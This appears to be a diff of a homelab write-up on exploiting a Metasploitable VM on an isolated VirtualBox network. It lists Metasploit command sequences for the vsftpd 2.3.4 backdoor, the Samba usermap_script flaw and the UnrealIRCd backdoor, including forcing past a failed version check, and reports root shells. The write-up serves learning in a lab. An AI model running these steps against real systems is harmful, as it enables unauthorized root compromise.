@@ -42,8 +42,6 @@ Network: VirtualBox Internal Network named `homelabnetwork`, subnet 192.168.56.0
 
 ## Troubleshooting log
 
-- **Empty folder in the VirtualBox file picker:** the ZIP hadn't been extracted yet. Fixed by extracting it fully before browsing to the `.vmdk`.
-
 - **No "ISO Image" needed:** Metasploitable ships as a ready-made disk (`.vmdk`), not an installer. Left ISO Image empty and attached the `.vmdk` directly as an existing hard disk.
 
 - **"Skip Unattended Installation" checkbox greyed out:** harmless in this VirtualBox version when no ISO is selected. Continued past it with no issue, since attaching an existing disk skips the install flow anyway.
@@ -88,7 +86,7 @@ vsftpd 2.3.4's source was compromised in 2011; a backdoor was inserted so that s
 3. `use exploit/unix/ftp/vsftpd_234_backdoor`
 4. `set RHOSTS 192.168.56.30`
 5. `set LHOST 192.168.56.10`
-6. `run`
+6. `exploit`
 
 ### Result
 Meterpreter session opened. Entering `getuid` confirmed root access (uid=0, gid=0).
@@ -110,7 +108,7 @@ Older versions of Samba's (2007 versions 3.0.0 to 3.0.25rc3) "username map scrip
 3. `use exploit/multi/samba/usermap_script`
 4. `set RHOSTS 192.168.56.30`
 5. `set LHOST 192.168.56.10`
-6. `run`
+6. `exploit`
 
 ### Result
 A command shell session opened. Unlike Meterpreter, this shell shows no visible prompt. Confirmed it was live by typing `whoami` blind, which returned `root`.
@@ -135,7 +133,7 @@ UnrealIRCd's official source was compromised in 2009; a backdoor was inserted so
 3. `set RHOSTS 192.168.56.30`
 4. `set LHOST 192.168.56.10`
 5. Initial run failed version check: "not-vulnerable: UnrealIRCd 3.2.8.1 not detected." Nmap's version scan couldn't confirm the exact build from the banner either.
-6. Forced the exploit past the check: `set ForceExploit true`, then `run`.
+6. Forced the exploit past the check: `set ForceExploit true`, then `exploit`.
 
 ### Result
 Meterpreter session opened successfully despite the version-check warning, since the warning only reflects a failed banner match, not the actual outcome. Confirmed root access with `getuid`.
